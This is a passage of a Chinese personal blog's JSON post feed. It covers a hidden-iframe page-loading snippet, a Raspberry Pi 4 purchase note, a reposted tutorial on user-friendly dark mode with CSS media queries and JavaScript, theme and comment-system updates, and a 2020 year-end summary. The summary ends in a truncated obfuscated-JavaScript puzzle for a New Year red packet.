</span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) 